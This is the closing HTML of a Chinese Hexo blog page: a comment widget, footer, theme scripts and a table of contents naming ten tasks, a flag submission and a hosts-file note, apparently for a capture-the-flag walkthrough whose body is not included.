</span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;评论</div><div class="valine-container"><script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="vcomments"></div><script data-pjax>function loadValine(){function e(e){switch(e){case"en":return"Author";case"zh-CN":return"博主";default:return"Master"}}new Valine({el:"#vcomments",appId:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appKey:"C0Wy6Sfq0qVag0nm59fc1D12",meta:["nick","mail","link"],avatar:"wavatar",enableQQ:!0,placeholder:"道友，请留步！请留言~",lang:"zh-CN".toLowerCase()});const a=setInterval(()=>{const n=document.querySelectorAll("#vcomments .vcards .vcard");if(n.length>0){let t="涂寐";if(t)for(let a of n){const n=a.querySelector(".vhead .vnick"),l=n.innerHTML;l===t&&(n.innerHTML=`${l} <span class="author">${e(KEEP.hexo_config.language)}</span>`)}clearInterval(a)}else clearInterval(a)},2e3)}{const e=setTimeout(()=>{loadValine(),clearTimeout(e)},1e3)}</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-1"><span class="nav-number">1.</span> <span class="nav-text">TASK 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-2"><span class="nav-number">2.</span> <span class="nav-text">TASK 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-3"><span class="nav-number">3.</span> <span class="nav-text">TASK 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-4"><span class="nav-number">4.</span> <span class="nav-text">TASK 4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-5"><span class="nav-number">5.</span> <span class="nav-text">TASK 5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-6"><span class="nav-number">6.</span> <span class="nav-text">TASK 6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-7"><span class="nav-number">7.</span> <span class="nav-text">TASK 7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-8"><span class="nav-number">8.</span> <span class="nav-text">TASK 8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-9"><span class="nav-number">9.</span> <span class="nav-text">TASK 9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-10"><span class="nav-number">10.</span> <span class="nav-text">TASK 10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUBMIT-FLAG"><span class="nav-number">11.</span> <span class="nav-text">SUBMIT FLAG</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#P-S-%E9%85%8D%E7%BD%AE-hosts-%E6%96%87%E4%BB%B6%E4%BB%A5%E8%A7%A3%E6%9E%90%E7%BD%91%E5%9D%80"><span class="nav-number">12.</span> <span class="nav-text">P.S.配置 hosts 文件以解析网址</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2021</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate" style="color:red"></i> &nbsp;<a href="/">涂寐</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"></div><div class="theme-info info-item">由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/JiZItHVhLKBShkL0/quote.js?theme=#1690FF,#333333,#999999,#333333,#FFFFFF,#1690FF,18&f=18&display=0,0,1,1,0,1,1,1"></script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script><div class="post-scripts pjax"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script></div><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{KEEP.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{KEEP.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),KEEP.refresh()})})</script></body></html>